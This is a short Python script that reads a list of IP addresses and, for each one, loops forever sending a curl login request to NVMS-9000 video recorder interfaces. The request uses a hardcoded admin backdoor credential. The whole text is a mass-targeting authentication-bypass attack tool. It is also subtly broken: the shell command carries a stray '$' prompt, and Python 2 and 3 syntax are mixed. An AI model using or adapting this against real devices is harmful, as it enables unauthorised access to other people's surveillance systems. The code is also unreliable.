import subprocess
file = open("ip.txt")
for url in file:
    ip=url.replace(" ","")
    ip=ip.replace("\n","")
    print ip
    payload='''
    $ curl -v http://'''+ip+'''/doLogin -X POST -d '<?xml version="1.0" encoding="utf-8" ?><request version="1.0" systemType="NVMS-9000" clientType="WEB"/>' --user "admin:{12213BD1-69C7-4862-843D-260500D1DA40}"
    '''

    print(payload)

    while 1:
            subprocess.Popen(payload, shell=True).wait()
